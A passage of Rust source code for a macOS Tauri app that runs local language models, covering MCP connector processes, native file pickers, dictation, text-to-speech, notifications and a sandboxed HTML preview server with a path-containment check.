    if let Some(mut child) = child {
        let _ = child.kill();
        let _ = child.wait();
    }
    Ok(())
}

// install: voir install.rs

// tools: voir tools.rs

// documents: voir documents.rs

/// The counter that lets Stop reach a start, and the trap it comes with.
#[cfg(test)]
mod server_generation_tests {
    use super::*;

    /// A start must not be cancelled by the stop it performs itself.
    ///
    /// WHAT THIS PINS, and it shipped broken. `server_start` stops whatever is
    /// running before launching the next model, and `server_stop_impl` bumps
    /// SERVER_GEN so that a Stop pressed during the slow preflight can reach a
    /// process that does not exist yet. Read the counter at the top of
    /// `server_start` and it is compared against a value the function's own
    /// internal stop has already moved: the check fires every time, and every
    /// model refuses to load with "cancelled". The counter has to be read
    /// AFTER that stop, and the difference between the two readings is what
    /// this test states.
    #[test]
    fn a_start_reads_its_generation_after_its_own_stop_and_not_before() {
        static LOCK: Mutex<()> = Mutex::new(());
        let _guard = LOCK.lock().unwrap_or_else(|e| e.into_inner());

        let too_early = SERVER_GEN.load(Ordering::SeqCst);
        // The internal stop every start performs. With no child it is a no-op
        // apart from the thing that matters here.
        server_stop_impl().expect("stopping nothing is not a failure");
        let entry_gen = SERVER_GEN.load(Ordering::SeqCst);
        assert_ne!(
            too_early, entry_gen,
            "the internal stop is expected to bump the counter: that is the whole trap"
        );

        // What the start does next, and what it checks.
        let generation = SERVER_GEN.fetch_add(1, Ordering::SeqCst) + 1;
        assert_eq!(
            generation,
            entry_gen + 1,
            "a start that read the counter after its own stop must not refuse itself"
        );
        assert_ne!(
            generation,
            too_early + 1,
            "reading before the stop is what shipped, and it cancelled every start"
        );
    }
}

// ---------------------------------------------------------------- MCP

struct McpServerProc {
    child: Child,
    stdin: std::process::ChildStdin,
    pending: Arc<Mutex<HashMap<u64, std::sync::mpsc::Sender<Value>>>>,
    next_id: u64,
}

#[derive(Serialize, Clone)]
struct McpToolInfo {
    server: String,
    name: String,
    description: String,
    input_schema: Value,
}

/// One lock PER SERVER, not one lock for all of them.
///
/// A single map-wide lock held across a call meant one slow connector stopped
/// every other connector: a tool call waits up to 60 seconds for its answer, and
/// while it waited nothing else could reach any MCP server, nor list one. Servers
/// are independent processes and the code now says so.
static MCP: OnceLock<Mutex<HashMap<String, Arc<Mutex<McpServerProc>>>>> = OnceLock::new();
static MCP_TOOLS: OnceLock<Mutex<Vec<McpToolInfo>>> = OnceLock::new();
/// Child pids, kept beside the map so shutdown never has to take a server lock.
/// At exit a connector may be mid-call, holding its own lock for another minute;
/// waiting for that to close the window would read as an app that will not quit.
static MCP_PIDS: OnceLock<Mutex<Vec<u32>>> = OnceLock::new();

fn mcp_state() -> &'static Mutex<HashMap<String, Arc<Mutex<McpServerProc>>>> {
    MCP.get_or_init(|| Mutex::new(HashMap::new()))
}

fn mcp_pids() -> &'static Mutex<Vec<u32>> {
    MCP_PIDS.get_or_init(|| Mutex::new(Vec::new()))
}

// Declared here rather than pulling in a crate for one signal. Not killpg: an
// MCP connector is spawned normally and is not a process group leader, so a
// group signal would reach this app's own group.
extern "C" {
    fn kill(pid: i32, sig: i32) -> i32;
}
const SIG_KILL: i32 = 9;

/// SIGKILL every connector child, by pid.
fn mcp_kill_children() {
    if let Ok(pids) = mcp_pids().lock() {
        for pid in pids.iter() {
            // SAFETY: a plain kill(2) on a pid this process spawned. A pid that
            // has already exited returns ESRCH, which is not an error here.
            unsafe { kill(*pid as i32, SIG_KILL) };
        }
    }
}

fn mcp_tools_state() -> &'static Mutex<Vec<McpToolInfo>> {
    MCP_TOOLS.get_or_init(|| Mutex::new(Vec::new()))
}

fn mcp_request(proc_: &mut McpServerProc, method: &str, params: Value) -> Result<Value, String> {
    proc_.next_id += 1;
    let id = proc_.next_id;
    let (tx, rx) = std::sync::mpsc::channel();
    proc_.pending.lock().unwrap_or_else(|e| e.into_inner()).insert(id, tx);
    let msg = json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params});
    writeln!(proc_.stdin, "{}", serde_json::to_string(&msg).unwrap()).map_err(|e| e.to_string())?;
    proc_.stdin.flush().map_err(|e| e.to_string())?;
    let res = rx.recv_timeout(Duration::from_secs(60));
    if res.is_err() {
        // Otherwise the sender leaks in the map, one entry per timeout.
        proc_.pending.lock().unwrap_or_else(|e| e.into_inner()).remove(&id);
    }
    res.map_err(|_| format!("MCP timeout on {method}"))
}

fn mcp_notify(proc_: &mut McpServerProc, method: &str, params: Value) -> Result<(), String> {
    let msg = json!({"jsonrpc": "2.0", "method": method, "params": params});
    writeln!(proc_.stdin, "{}", serde_json::to_string(&msg).unwrap()).map_err(|e| e.to_string())?;
    proc_.stdin.flush().map_err(|e| e.to_string())
}

/// A GUI app on macOS inherits a bare PATH (/usr/bin:/bin): npx, node, uvx
/// and friends live in Homebrew or user dirs and would never be found.
fn augmented_path() -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    let mut path = std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin:/usr/sbin:/sbin".into());
    let extras = [
        "/opt/homebrew/bin".to_string(),
        "/opt/homebrew/sbin".to_string(),
        "/usr/local/bin".to_string(),
        format!("{home}/.local/bin"),
        format!("{home}/.bun/bin"),
        format!("{home}/.cargo/bin"),
        format!("{home}/.volta/bin"),
    ];
    for extra in extras {
        if !path.split(':').any(|p| p == extra) {
            path.push(':');
            path.push_str(&extra);
        }
    }
    path
}

/// Resolve a connector command against the augmented PATH, with a clear
/// error instead of a silent ENOENT swallowed by the UI.
fn resolve_command(cmd: &str, path: &str) -> Result<PathBuf, String> {
    if cmd.contains('/') {
        let p = PathBuf::from(cmd);
        return if p.is_file() {
            Ok(p)
        } else {
            Err(format!("command not found: {cmd}"))
        };
    }
    for dir in path.split(':') {
        let cand = Path::new(dir).join(cmd);
        if cand.is_file() {
            return Ok(cand);
        }
    }
    Err(format!("command '{cmd}' not found (PATH searched, Homebrew included). Install it or use an absolute path."))
}

#[tauri::command]
async fn mcp_reload() -> Result<Vec<McpToolInfo>, String> {
    // On a blocking thread: this spawns processes and runs an initialize
    // handshake per connector, and it waits on the lock of any server that is
    // mid-call. None of that belongs on an async worker.
    tauri::async_runtime::spawn_blocking(mcp_reload_blocking)
        .await
        .map_err(|e| format!("the connector thread died: {e}"))?
}

fn mcp_reload_blocking() -> Result<Vec<McpToolInfo>, String> {
    // One reload at a time: two concurrent reloads would each drain the
    // server map and spawn duplicate children.
    static RELOAD_GATE: OnceLock<Mutex<()>> = OnceLock::new();
    let _serial = RELOAD_GATE
        .get_or_init(|| Mutex::new(()))
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    // Tear down previous servers.
    {
        let drained: Vec<Arc<Mutex<McpServerProc>>> = {
            let mut servers = mcp_state().lock().unwrap_or_else(|e| e.into_inner());
            servers.drain().map(|(_, p)| p).collect()
        };
        mcp_pids().lock().unwrap_or_else(|e| e.into_inner()).clear();
        for p in drained {
            // Waits for an in-flight call on that server to return, which is the
            // right order: killing a child out from under a thread reading its
            // pipe turns a slow answer into a confusing error.
            let mut p = p.lock().unwrap_or_else(|e| e.into_inner());
            let _ = p.child.kill();
            let _ = p.child.wait();
        }
    }
    mcp_tools_state().lock().unwrap_or_else(|e| e.into_inner()).clear();

    let settings = settings_load();
    let config: Value = serde_json::from_str(settings.get("mcp").map(|s| s.as_str()).unwrap_or("{}"))
        .map_err(|e| format!("mcp config: {e}"))?;
    let empty = serde_json::Map::new();
    let servers_cfg = config["mcpServers"].as_object().unwrap_or(&empty);

    // One failing connector must not take the others down: each server is
    // started independently, failures are collected, and the tools of every
    // server that DID initialize are published regardless.
    let mut all_tools = Vec::new();
    let mut failures: Vec<String> = Vec::new();
    for (name, cfg) in servers_cfg {
        match mcp_start_server(name, cfg) {
            Ok((proc_, mut tools)) => {
                all_tools.append(&mut tools);
                mcp_pids().lock().unwrap_or_else(|e| e.into_inner()).push(proc_.child.id());
                mcp_state()
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .insert(name.clone(), Arc::new(Mutex::new(proc_)));
            }
            Err(e) => failures.push(format!("{name}: {e}")),
        }
    }
    *mcp_tools_state().lock().unwrap_or_else(|e| e.into_inner()) = all_tools.clone();
    if failures.is_empty() {
        Ok(all_tools)
    } else {
        // The healthy servers stay registered (mcp_tools serves their tools);
        // the error carries every failing connector for the UI.
        Err(failures.join("\n"))
    }
}

/// Spawn one MCP connector and run its initialize handshake. On any failure
/// past the spawn the child is killed and reaped: it must not linger as an
/// orphan behind the error.
fn mcp_start_server(name: &str, cfg: &Value) -> Result<(McpServerProc, Vec<McpToolInfo>), String> {
    let command = cfg["command"].as_str().ok_or("missing command".to_string())?;
    let args: Vec<String> = cfg["args"]
        .as_array()
        .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
        .unwrap_or_default();
    let search_path = augmented_path();
    let bin = resolve_command(command, &search_path)?;
    let mut cmd = Command::new(bin);
    cmd.args(&args)
        // The child needs the full PATH too: npx must find node.
        .env("PATH", &search_path)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    if let Some(env) = cfg["env"].as_object() {
        for (k, v) in env {
            if let Some(val) = v.as_str() {
                cmd.env(k, val);
            }
        }
    }
    let mut child = cmd.spawn().map_err(|e| e.to_string())?;
    let stdin = match child.stdin.take() {
        Some(s) => s,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            return Err("no stdin".into());
        }
    };
    let stdout = match child.stdout.take() {
        Some(s) => s,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            return Err("no stdout".into());
        }
    };
    let pending: Arc<Mutex<HashMap<u64, std::sync::mpsc::Sender<Value>>>> =
        Arc::new(Mutex::new(HashMap::new()));
    let pending_reader = pending.clone();
    std::thread::spawn(move || {
        let reader = BufReader::new(stdout);
        for line in reader.lines() {
            // A line that does not decode is skipped, not fatal: this is a
            // child process's output, and one odd byte must not silence the
            // rest of it. Spelled out rather than written `.flatten()`, which
            // says the same thing and spins forever on a reader that fails
            // forever; a pipe reports EOF instead, so this loop ends.
            let Ok(line) = line else { continue };
            if let Ok(v) = serde_json::from_str::<Value>(&line) {
                if let Some(id) = v["id"].as_u64() {
                    if let Some(tx) = pending_reader.lock().unwrap_or_else(|e| e.into_inner()).remove(&id) {
                        let _ = tx.send(v);
                    }
                }
            }
        }
    });

    let mut proc_ = McpServerProc { child, stdin, pending, next_id: 0 };
    let init_seq = (|| -> Result<Value, String> {
        mcp_request(
            &mut proc_,
            "initialize",
            json!({
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "galactus", "version": "0.1.0"}
            }),
        )?;
        mcp_notify(&mut proc_, "notifications/initialized", json!({}))?;
        mcp_request(&mut proc_, "tools/list", json!({}))
    })();
    let tools = match init_seq {
        Ok(t) => t,
        Err(e) => {
            let _ = proc_.child.kill();
            let _ = proc_.child.wait();
            return Err(e);
        }
    };
    let mut out = Vec::new();
    if let Some(list) = tools["result"]["tools"].as_array() {
        for tl in list {
            out.push(McpToolInfo {
                server: name.to_string(),
                name: tl["name"].as_str().unwrap_or("").to_string(),
                description: tl["description"].as_str().unwrap_or("").to_string(),
                input_schema: tl["inputSchema"].clone(),
            });
        }
    }
    Ok((proc_, out))
}

#[tauri::command]
fn mcp_tools() -> Vec<McpToolInfo> {
    mcp_tools_state().lock().unwrap_or_else(|e| e.into_inner()).clone()
}

#[tauri::command]
async fn mcp_call(server: String, tool: String, args: String) -> Result<String, String> {
    let parsed: Value = serde_json::from_str(&args).unwrap_or(json!({}));
    // The map lock is held only long enough to find the server. Everything that
    // waits happens under that server's own lock, on a blocking thread, so a
    // connector taking its full minute blocks nothing but itself.
    let handle = {
        let servers = mcp_state().lock().unwrap_or_else(|e| e.into_inner());
        servers.get(&server).cloned().ok_or(format!("MCP server {server} not running"))?
    };
    let tool_for_call = tool.clone();
    let response = tauri::async_runtime::spawn_blocking(move || {
        let mut proc_ = handle.lock().unwrap_or_else(|e| e.into_inner());
        mcp_request(&mut proc_, "tools/call", json!({"name": tool_for_call, "arguments": parsed}))
    })
    .await
    .map_err(|e| format!("the connector thread died: {e}"))??;
    if let Some(err) = response.get("error") {
        return Err(err["message"].as_str().unwrap_or("MCP error").to_string());
    }
    // Concatenate text content blocks; pass through anything else as JSON.
    let content = &response["result"]["content"];
    if let Some(blocks) = content.as_array() {
        let texts: Vec<String> = blocks
            .iter()
            .filter_map(|b| b["text"].as_str().map(String::from))
            .collect();
        if !texts.is_empty() {
            return Ok(texts.join("\n"));
        }
    }
    Ok(response["result"].to_string())
}

// ---------------------------------------------------------------- folder detect + picker

fn is_root(p: &Path) -> bool {
    p.join("scripts/models-registry.json").is_file()
}

fn run_with_timeout(cmd: &str, args: &[String], secs: u64) -> String {
    let child = Command::new(cmd)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn();
    let Ok(child) = child else {
        return String::new();
    };
    // The child is killed at the deadline (a `find` over a slow NAS volume must
    // not keep hammering the disk after detection already moved on).
    match crate::tools::run_with_deadline(child, Instant::now() + Duration::from_secs(secs)) {
        Ok(o) => o.stdout,
        Err(_) => String::new(),
    }
}

fn find_registry(base: &str) -> Option<String> {
    let args: Vec<String> = [
        base, "-maxdepth", "6", "-type", "f", "-name", "models-registry.json", "-path",
        "*/scripts/*",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    let out = run_with_timeout("find", &args, 6);
    let line = out.lines().next()?;
    let p = Path::new(line);
    let root = p.parent()?.parent()?;
    if is_root(root) {
        Some(root.display().to_string())
    } else {
        None
    }
}

#[tauri::command]
fn detect_root() -> Option<String> {
    let map = settings_load();
    if let Some(r) = map.get("root") {
        if is_root(Path::new(r)) {
            return Some(r.clone());
        }
    }
    let home = std::env::var("HOME").unwrap_or_default();
    let mut bases = vec![
        home.clone(),
        format!("{home}/Documents"),
        format!("{home}/Developer"),
        format!("{home}/Projects"),
        format!("{home}/Desktop"),
    ];
    if let Ok(rd) = std::fs::read_dir("/Volumes") {
        for e in rd.flatten() {
            bases.push(e.path().display().to_string());
        }
    }
    for base in bases {
        if !Path::new(&base).exists() {
            continue;
        }
        if let Some(root) = find_registry(&base) {
            return Some(root);
        }
    }
    // No checkout anywhere: self-provision from the bundled data so the app
    // works out of the box.
    provision_default_root()
        .ok()
        .map(|p| p.display().to_string())
}

/// Native macOS folder chooser via osascript. Returns None on cancel.
#[tauri::command]
fn pick_folder() -> Result<Option<String>, String> {
    // The native panel first. It is this process's own window: no Apple Event,
    // no Automation permission, and nothing that can be refused on behalf of
    // somebody else. osascript's `choose folder` answered "cancelled by the
    // user" on a machine where nobody cancelled anything, which is what a
    // refused Apple Event looks like from the outside, and four rounds went
    // into that disguise.
    match swift_helper("galactus-pick") {
        Ok(bin) => {
            let out = Command::new(&bin)
                .arg("folder")
                .arg(std::env::var("HOME").unwrap_or_default())
                .output()
                .map_err(|e| e.to_string())?;
            return match out.status.code() {
                Some(0) => {
                    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    Ok(if p.is_empty() { None } else { Some(p) })
                }
                // 2 is a real cancel, and the helper is the only thing here that
                // can tell one from a failure without reading a sentence.
                Some(2) => Ok(None),
                _ => Err(format!(
                    "the folder chooser could not open: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                )),
            };
        }
        // No swiftc and no prebuilt helper: fall through to the old path rather
        // than refusing outright. It works on plenty of machines, and one that
        // cannot build the helper is not automatically one where it fails.
        Err(_) => {}
    }
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose folder with prompt \"Select your Galactus folder\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        // EVERY failure used to return Ok(None), the same answer as "the user
        // pressed Cancel", so a chooser that could not open at all was
        // indistinguishable from one the user dismissed: the button appeared to
        // do nothing, twice, and there was nothing to read either time. The
        // stderr osascript writes was captured and thrown away on the same line.
        return match classify_chooser_failure(&String::from_utf8_lossy(&out.stderr)) {
            None => Ok(None),
            Some(reason) => Err(reason),
        };
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}

/// Native WAV chooser, for the speech-to-video models. Same helper, same
/// contract as pick_image; osascript fallback restricted to WAV.
#[tauri::command]
fn pick_audio() -> Result<Option<String>, String> {
    match swift_helper("galactus-pick") {
        Ok(bin) => {
            let out = Command::new(&bin)
                .arg("audio")
                .arg(std::env::var("HOME").unwrap_or_default())
                .output()
                .map_err(|e| e.to_string())?;
            return match out.status.code() {
                Some(0) => {
                    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    Ok(if p.is_empty() { None } else { Some(p) })
                }
                Some(2) => Ok(None),
                _ => Err(format!(
                    "the audio chooser could not open: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                )),
            };
        }
        Err(_) => {}
    }
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose file of type {\"com.microsoft.waveform-audio\"} with prompt \"Choose a WAV file\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return match classify_chooser_failure(&String::from_utf8_lossy(&out.stderr)) {
            None => Ok(None),
            Some(reason) => Err(reason),
        };
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}

/// Native image chooser, for the video models that animate a starting picture.
///
/// The same helper and the same contract as `pick_folder`, in file mode. The
/// osascript fallback mirrors the folder one for the same machine-without-
/// swiftc reason, and restricts to images the same way the panel does.
#[tauri::command]
fn pick_image() -> Result<Option<String>, String> {
    match swift_helper("galactus-pick") {
        Ok(bin) => {
            let out = Command::new(&bin)
                .arg("image")
                .arg(std::env::var("HOME").unwrap_or_default())
                .output()
                .map_err(|e| e.to_string())?;
            return match out.status.code() {
                Some(0) => {
                    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    Ok(if p.is_empty() { None } else { Some(p) })
                }
                Some(2) => Ok(None),
                // A bundled helper built before the image mode existed answers
                // a usage error on exit 1. Falling through to osascript keeps
                // the button working on an app whose packaged helper is stale.
                _ => match Command::new("osascript")
                    .arg("-e")
                    .arg("POSIX path of (choose file of type {\"public.png\", \"public.jpeg\"} with prompt \"Choose a starting picture\")")
                    .output()
                {
                    Ok(o) if o.status.success() => {
                        let p = String::from_utf8_lossy(&o.stdout).trim().to_string();
                        Ok(if p.is_empty() { None } else { Some(p) })
                    }
                    Ok(o) => match classify_chooser_failure(&String::from_utf8_lossy(&o.stderr)) {
                        None => Ok(None),
                        Some(reason) => Err(reason),
                    },
                    Err(e) => Err(e.to_string()),
                },
            };
        }
        Err(_) => {}
    }
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose file of type {\"public.png\", \"public.jpeg\"} with prompt \"Choose a starting picture\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return match classify_chooser_failure(&String::from_utf8_lossy(&out.stderr)) {
            None => Ok(None),
            Some(reason) => Err(reason),
        };
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}

/// What osascript's stderr means: nothing to report, or a sentence for the user.
///
/// Cancelling is not a fault and must stay silent, or every dismissed dialog
/// would raise an error toast. Anything else is a fault and has to be said,
/// because the alternative is a button that does nothing for a reason nobody
/// can see. Error -1743 is macOS refusing the app permission to send the event
/// at all, which no amount of clicking will fix and which names its own remedy.
fn classify_chooser_failure(stderr: &str) -> Option<String> {
    let text = stderr.trim();
    let lowered = text.to_lowercase();
    if text.is_empty() {
        return None;
    }
    // The CODE, not the sentence. osascript writes its errors in the user's
    // language: a French Mac says "Annule par l'utilisateur. (-128)", and the
    // first version of this function matched only the English wording, so every
    // ordinary cancel on a non-English Mac was reported as a fault. The number
    // is the same in every language and is the only part worth reading.
    if text.contains("-128") {
        return None;
    }
    if text.contains("-1743") || lowered.contains("not allowed to send apple events") {
        return Some(
            "macOS is refusing Galactus permission to open the folder chooser. \
             Open System Settings, Privacy and Security, Automation, and allow Galactus."
                .into(),
        );
    }
    Some(format!("the folder chooser could not open: {}", text.lines().next().unwrap_or(text)))
}


pub(crate) fn app_support() -> PathBuf {
    settings_path().parent().unwrap().to_path_buf()
}

// library: voir library.rs

// conversations: voir conversations.rs

// ---------------------------------------------------------------- voice

struct VoiceState {
    child: Option<Child>,
}

static VOICE: OnceLock<Mutex<VoiceState>> = OnceLock::new();

fn voice_state() -> &'static Mutex<VoiceState> {
    VOICE.get_or_init(|| Mutex::new(VoiceState { child: None }))
}

/// The on-device speech helper (Apple SFSpeechRecognizer): precompiled in the
/// bundle, compiled from source as a dev fallback.
fn voice_helper() -> Result<PathBuf, String> {
    if let Some(res) = resource_dir() {
        let prebuilt = res.join("packaged/galactus-voice");
        if prebuilt.is_file() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if let Ok(meta) = std::fs::metadata(&prebuilt) {
                    let mut perm = meta.permissions();
                    if perm.mode() & 0o111 == 0 {
                        perm.set_mode(0o755);
                        let _ = std::fs::set_permissions(&prebuilt, perm);
                    }
                }
            }
            return Ok(prebuilt);
        }
    }
    let bin = app_support().join("galactus-voice");
    let src = std::env::current_dir()
        .unwrap_or_default()
        .join("src-tauri/helpers/galactus-voice.swift");
    if !src.is_file() {
        return Err("voice helper not available".into());
    }
    if !bin.is_file() {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        let out = Command::new("swiftc")
            .args(["-O", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .map_err(|e| format!("swiftc unavailable ({e})"))?;
        if !out.status.success() {
            return Err("voice helper failed to build".into());
        }
    }
    Ok(bin)
}

/// Start on-device dictation. Streams `galactus://voice` events:
/// {kind: "partial"|"final"|"error", text}.
#[tauri::command]
fn voice_start(app: AppHandle, locale: Option<String>) -> Result<(), String> {
    let bin = voice_helper()?;
    {
        // One dictation at a time.
        let mut v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
        if let Some(mut old) = v.child.take() {
            let _ = old.kill();
            let _ = old.wait();
        }
    }
    let mut child = Command::new(&bin)
        .arg("listen")
        .arg("--locale")
        .arg(locale.unwrap_or_else(|| "fr-FR".into()))
        .args(["--max-seconds", "90"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| e.to_string())?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let my_pid = child.id();
    voice_state().lock().unwrap_or_else(|e| e.into_inner()).child = Some(child);

    std::thread::spawn(move || {
        let reader = BufReader::new(stdout);
        let mut terminal_sent = false;
        for line in reader.lines() {
            // A line that does not decode is skipped, not fatal: this is a
            // child process's output, and one odd byte must not silence the
            // rest of it. Spelled out rather than written `.flatten()`, which
            // says the same thing and spins forever on a reader that fails
            // forever; a pipe reports EOF instead, so this loop ends.
            let Ok(line) = line else { continue };
            let (kind, text) = if let Some(t) = line.strip_prefix("PARTIAL ") {
                ("partial", t.to_string())
            } else if let Some(t) = line.strip_prefix("FINAL ") {
                ("final", t.to_string())
            } else if let Some(t) = line.strip_prefix("ERROR ") {
                ("error", t.to_string())
            } else {
                continue;
            };
            let _ = app.emit("galactus://voice", json!({"kind": kind, "text": text}));
            if kind != "partial" {
                terminal_sent = true;
                break;
            }
        }
        // The helper can die without a terminal line (killed hard, crash):
        // the UI must still get unstuck.
        if !terminal_sent {
            let _ = app.emit("galactus://voice", json!({"kind": "final", "text": ""}));
        }
        // Reap OUR child only, a fresh dictation may already have replaced
        // it; and never hold the lock across wait().
        let mine = {
            let mut v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
            if v.child.as_ref().map(|c| c.id()) == Some(my_pid) {
                v.child.take()
            } else {
                None
            }
        };
        if let Some(mut c) = mine {
            let _ = c.wait();
        }
    });
    Ok(())
}

/// Graceful stop: SIGTERM lets the helper flush its FINAL line first.
#[tauri::command]
fn voice_stop() {
    let v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
    if let Some(c) = v.child.as_ref() {
        let _ = Command::new("kill").args(["-TERM", &c.id().to_string()]).output();
    }
}

// ---------------------------------------------------------------- text-to-speech

static TTS: OnceLock<Mutex<Option<Child>>> = OnceLock::new();

/// Read text aloud with the system voice (`say`, fully offline). A new call
/// replaces the previous one.
#[tauri::command]
fn tts_speak(text: String) -> Result<(), String> {
    let mut slot = TTS.get_or_init(|| Mutex::new(None)).lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut old) = slot.take() {
        let _ = old.kill();
        let _ = old.wait();
    }
    let clipped: String = text.chars().take(4000).collect();
    let child = Command::new("say")
        .arg("--")
        .arg(clipped)
        .spawn()
        .map_err(|e| e.to_string())?;
    *slot = Some(child);
    Ok(())
}

#[tauri::command]
fn tts_stop() {
    let mut slot = TTS.get_or_init(|| Mutex::new(None)).lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut old) = slot.take() {
        let _ = old.kill();
        let _ = old.wait();
    }
}

// ---------------------------------------------------------------- notifications

/// Native macOS notification. Used when a long task finishes while the window
/// is in the background, and when a model finishes loading.
#[tauri::command]
fn notify(title: String, body: String) -> Result<(), String> {
    // Newlines would break the AppleScript literal (and the failure would be
    // silent since osascript's exit code is not checked).
    let esc = |s: &str| {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace(['\n', '\r'], " ")
    };
    let script = format!(
        "display notification \"{}\" with title \"{}\" sound name \"Ping\"",
        esc(&body),
        esc(&title)
    );
    Command::new("osascript")
        .arg("-e")
        .arg(script)
        .spawn()
        .map(|_| ())
        .map_err(|e| e.to_string())
}

/// Live engine metrics: resident memory of the llama-server process.
#[tauri::command]
fn server_metrics() -> Value {
    let pid = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        match s.child.as_ref() {
            Some(c) => c.id(),
            None => return json!({ "running": false }),
        }
    };
    let rss_kb = Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()
        .ok()
        .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().parse::<u64>().ok())
        .unwrap_or(0);
    json!({ "running": true, "rss_bytes": rss_kb * 1024 })
}

#[tauri::command]
fn server_log() -> String {
    std::fs::read_to_string(app_support().join("llama-server.log")).unwrap_or_default()
}

// ------------------------------------------------------- preview protocol
//
// The live preview renders model-written HTML. Feeding it through an iframe
// `srcdoc` made it inherit the APP's content policy, which allows nothing
// external: every previewed page lost its images, fonts, stylesheets and
// scripts, and looked broken for a reason that had nothing to do with the
// page. A document served over its own scheme carries its own policy instead
// of inheriting ours, so the preview finally shows what a browser would show.
//
// The isolation is unchanged and does not rely on the policy: the frame keeps
// `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, so the page lives in
// an opaque origin with no access to the app, no IPC, and no way to navigate
// it. That is the same exposure as the "open in browser" button next to it.

fn preview_slot() -> &'static Mutex<(u64, String)> {
    static SLOT: OnceLock<Mutex<(u64, String)>> = OnceLock::new();
    SLOT.get_or_init(|| Mutex::new((0, String::new())))
}

/// The folder the preview serves files from, when it is serving a site.
///
/// Distinct from the published-HTML slot above, which answers one document with
/// no sub-resources. A site is a folder: index.html asks for styles.css, which
/// asks for a font, and every one of those has to resolve to a real file inside
/// one directory and nowhere else.
fn preview_root_slot() -> &'static Mutex<Option<PathBuf>> {
    static ROOT: OnceLock<Mutex<Option<PathBuf>>> = OnceLock::new();
    ROOT.get_or_init(|| Mutex::new(None))
}

/// Point the preview at a folder, or at nothing.
#[tauri::command]
fn preview_set_root(root: Option<String>) -> Result<(), String> {
    let resolved = match root.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        Some(p) => Some(std::fs::canonicalize(p).map_err(|e| format!("{p}: {e}"))?),
        None => None,
    };
    *preview_root_slot().lock().unwrap_or_else(|e| e.into_inner()) = resolved;
    Ok(())
}

/// Resolve one request path inside the preview root, or refuse.
///
/// The containment check is the whole of the security here, and it is the same
/// shape as `inside()` in code.rs: canonicalise, then require the result to
/// start with the root. Canonicalising is what makes it hold, because "..",
/// a symlink out of the tree and an absolute path all become visible only after
/// the filesystem has resolved them.
fn preview_file_for(path: &str) -> Option<PathBuf> {
    let root = preview_root_slot().lock().unwrap_or_else(|e| e.into_inner()).clone()?;
    let rel = path.trim_start_matches('/');
    let rel = if rel.is_empty() { "index.html" } else { rel };
    // Percent-decoding, for the space in "my file.css". Only the escape itself:
    // anything else is left alone and will simply fail to open.
    let decoded = percent_decode(rel);
    let candidate = std::fs::canonicalize(root.join(&decoded)).ok()?;
    if !candidate.starts_with(&root) {
        return None;
    }
    candidate.is_file().then_some(candidate)
}

/// Minimal percent-decoding for a request path.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).ok();
            if let Some(v) = hex.and_then(|h| u8::from_str_radix(h, 16).ok()) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// The content type for a file the preview serves.
///
/// A table rather than a crate. It is twenty lines, it covers what a static
/// site is made of, and an unknown extension is served as an opaque stream
/// rather than guessed at, because a wrong text/html on a binary is worse than
/// a download.
fn preview_mime(path: &Path) -> &'static str {
    match path.extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase().as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" => "text/javascript; charset=utf-8",
        "json" | "map" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
